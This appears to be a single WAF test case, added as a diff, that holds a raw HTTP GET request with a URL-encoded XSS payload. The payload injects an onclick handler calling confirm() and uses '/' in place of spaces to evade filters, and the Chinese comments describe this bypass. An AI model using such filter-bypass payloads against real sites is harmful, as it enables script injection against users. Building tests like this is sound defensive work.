@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_标签属性(空格替换绕过)-06506853
+# 攻击载荷的目的是利用JavaScript的confirm()函数触发一个弹窗对话框。使用“/”代替空格填充
+GET /?id=%3Ca%22%2Fonclick=%28confirm%29%28%29%3Eclick&bid=hd_tag_m8mv24y0 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24y0
+RM-PRO-Token: dd9750e727e0f78b7b57cda4751ef4aa
+RM-PRO-Time: 1742808423152
+User-Agent: curl/7.83.1
+
